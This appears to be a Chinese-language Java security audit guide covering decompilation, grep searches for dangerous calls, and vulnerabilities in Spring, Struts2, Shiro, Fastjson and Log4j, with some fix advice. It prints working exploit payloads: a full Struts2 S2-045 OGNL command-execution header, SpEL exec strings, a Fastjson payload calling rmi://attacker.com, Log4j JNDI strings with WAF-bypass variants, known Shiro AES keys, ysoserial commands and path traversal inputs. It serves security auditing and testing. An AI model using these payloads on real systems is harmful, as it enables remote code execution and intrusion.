# ☕ Java 代码审计模块

## 适用场景
- Java Web 应用源码审计
- jar/war 包分析
- Spring/Struts/Shiro 框架

## 检查清单

```yaml
框架识别:
  - [ ] Spring/Spring Boot
  - [ ] Struts2
  - [ ] Apache Shiro
  - [ ] Fastjson
  - [ ] Log4j

危险函数:
  - [ ] Runtime.exec()
  - [ ] ProcessBuilder
  - [ ] ObjectInputStream
  - [ ] JNDI lookup
  - [ ] SpEL 表达式
  - [ ] OGNL 表达式

漏洞类型:
  - [ ] 命令执行
  - [ ] 反序列化
  - [ ] 表达式注入
  - [ ] XXE
  - [ ] SSRF
  - [ ] 任意文件操作
```

## 分析流程

### Step 1: 反编译 jar/war

```bash
# 使用 JD-GUI (图形界面)
java -jar jd-gui.jar target.jar

# 使用 CFR (命令行)
java -jar cfr.jar target.jar --outputdir output

# 使用 Procyon
java -jar procyon-decompiler.jar target.jar -o output

# 使用 JADX (也支持 Android)
jadx -d output target.jar

# 解压 war 包
unzip target.war -d output
```

#### 无工具替代方案
```bash
# 直接解压 jar (jar 是 zip 格式)
unzip target.jar -d output
# 查看 class 文件结构
javap -c com.example.MainClass

# 在线反编译
# http://www.javadecompilers.com/
# https://jdec.app/
```

### Step 2: 危险函数搜索

```bash
# 命令执行
grep -rn "Runtime.getRuntime().exec" .
grep -rn "ProcessBuilder" .
grep -rn "ScriptEngine" .

# 反序列化
grep -rn "ObjectInputStream" .
grep -rn "readObject" .
grep -rn "XMLDecoder" .
grep -rn "XStream" .

# JNDI 注入
grep -rn "lookup" .
grep -rn "InitialContext" .
grep -rn "JndiLookup" .

# 表达式注入
grep -rn "SpelExpressionParser" .
grep -rn "StandardEvaluationContext" .
grep -rn "Ognl" .
grep -rn "ValueStack" .

# 文件操作
grep -rn "FileInputStream" .
grep -rn "FileOutputStream" .
grep -rn "new File(" .

# XXE
grep -rn "XMLReader" .
grep -rn "SAXParser" .
grep -rn "DocumentBuilder" .
```

### Step 3: Spring 框架审计

```java
// 危险点1: SpEL 表达式注入
// 搜索关键字
grep -rn "SpelExpressionParser" .
grep -rn "parseExpression" .
grep -rn "@Value" .

// 漏洞代码示例
String expression = request.getParameter("expr");
SpelExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(expression);
Object value = exp.getValue();

// 利用 Payload
T(java.lang.Runtime).getRuntime().exec('id')
new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()

// 危险点2: 路径遍历
// 搜索关键字
grep -rn "getResource" .
grep -rn "ClassPathResource" .

// 危险点3: 模板注入
// Thymeleaf SSTI
grep -rn "TemplateEngine" .
grep -rn "@RequestMapping.*\\.html" .
```

### Step 4: Struts2 漏洞

```java
// OGNL 表达式注入
// 危险参数处理

// 常见 CVE
// S2-001: %{...} 表达式
// S2-003/S2-005: ParametersInterceptor
// S2-007: 类型转换错误
// S2-008: Cookie 拦截器
// S2-009: ParametersInterceptor 绕过
// S2-012: redirect 参数
// S2-013/S2-014: 链接标签
// S2-015: Action 名称
// S2-016: DefaultActionMapper
// S2-019: DMI 方法调用
// S2-029/S2-032: REST 插件
// S2-045/S2-046: Jakarta 多部分解析器
// S2-048: Struts Showcase
// S2-052: REST 插件 XStream
// S2-053: Freemarker 标签
// S2-057: alwaysSelectFullNamespace

// Payload 示例 (S2-045)
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

### Step 5: Apache Shiro 审计

```java
// 关键点1: RememberMe 反序列化
// 搜索关键字
grep -rn "RememberMeManager" .
grep -rn "CookieRememberMeManager" .
grep -rn "DefaultSecurityManager" .

// 默认 AES Key (常见泄露)
kPH+bIxk5D2deZiIxcaaaA==
4AvVhmFLUs0KTA3Kprsdag==
3AvVhmFLUs0KTA3Kprsdag==
2AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
wGiHplamyXlVB11UXWol8g==

// 利用方式
1. 使用 ysoserial 生成 payload
2. 用 Shiro AES Key 加密
3. 设置为 rememberMe Cookie

// 权限绕过
// CVE-2020-1957: /admin/;/page
// CVE-2020-11989: /admin/%2e
```

### Step 6: Fastjson 审计

```java
// 关键字搜索
grep -rn "JSON.parse" .
grep -rn "JSON.parseObject" .
grep -rn "JSONObject.parse" .
grep -rn "@type" .

// 漏洞版本
// 1.2.24 之前: 无限制
// 1.2.25-1.2.41: autoType 黑名单绕过
// 1.2.42-1.2.47: 各种绕过
// 1.2.48-1.2.68: expectClass 绕过
// 1.2.80: 新绕过

// 检测方法
{"@type":"java.net.Inet4Address","val":"dnslog.cn"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.cn"}}

// RCE Payload (1.2.24)
{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"rmi://attacker.com:1099/Exploit",
  "autoCommit":true
}

// JNDI 注入利用
java -jar JNDIExploit.jar -i 攻击者IP
```

### Step 7: Log4j 审计 (CVE-2021-44228)

```java
// 关键字搜索
grep -rn "log4j" .
grep -rn "Logger" .
grep -rn "LogManager" .

// 漏洞版本
// Log4j 2.0-beta9 到 2.14.1

// 检测 Payload
${jndi:ldap://dnslog.cn/a}
${jndi:rmi://dnslog.cn/a}
${jndi:dns://dnslog.cn}

// 绕过 WAF
${${lower:j}ndi:ldap://...}
${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://...}
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://...}
${${::-j}${::-n}${::-d}${::-i}:ldap://...}

// 利用
java -jar JNDIExploit.jar -i 攻击者IP
```

### Step 8: 反序列化利用链分析

```java
// 常见 Gadget 库
// Commons Collections 3.x/4.x
// Commons Beanutils
// Spring Framework
// Groovy
// JDK7u21

// 寻找 Gadget
1. 查找可控的反序列化入口
2. 检查 classpath 中的库版本
3. 使用 ysoserial 测试各个 Gadget

// 命令
java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin
java -jar ysoserial.jar CommonsCollections5 "calc" > payload.bin

// JNDI 利用 (JDK 8u191 之后受限)
// 使用 LDAP 返回序列化对象
// 或使用本地 Gadget
```

## 常见漏洞模式

### 模式 1: 命令注入

```java
// 危险代码
String cmd = request.getParameter("cmd");
Runtime.getRuntime().exec(cmd);

// 修复建议
// 使用白名单
// 使用 ProcessBuilder 参数数组
```

### 模式 2: SpEL 注入

```java
// 危险代码
String expr = request.getParameter("expr");
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(expr);

// Payload
T(java.lang.Runtime).getRuntime().exec('id')
```

### 模式 3: 路径遍历

```java
// 危险代码
String filename = request.getParameter("file");
File file = new File("/uploads/" + filename);

// Payload
../../etc/passwd
..\..\windows\win.ini
```

### 模式 4: XXE

```java
// 危险代码
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(inputStream);  // 未禁用外部实体

// 修复
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
```

## 无工具替代方案

```bash
# 如果没有反编译工具，可以：

# 1. 直接查看 JAR 内容
jar tvf target.jar

# 2. 使用 javap 看 class 结构
javap -c -p com.example.MainClass

# 3. 在线反编译
# http://www.javadecompilers.com/
# https://jdec.app/

# 4. 手工分析 bytecode
# 使用 hexdump 查看 class 文件
hexdump -C MainClass.class | head

# 5. 使用 Python 分析
# pip install uncompyle6 (Python bytecode)

# 如果没有 ysoserial：
# 1. 手工构造序列化数据
# 2. 使用在线工具生成
# 3. 从 GitHub 下载预生成的 payload
```

## 工具速查

```bash
# 反编译
jd-gui target.jar              # 图形界面
jadx -d output target.jar       # 命令行

# 漏洞利用
java -jar ysoserial.jar         # 反序列化 payload
java -jar JNDIExploit.jar       # JNDI 注入

# 代码审计辅助
# CodeQL
# Semgrep
# FindBugs/SpotBugs

# CVE 检测
# OWASP Dependency-Check
```
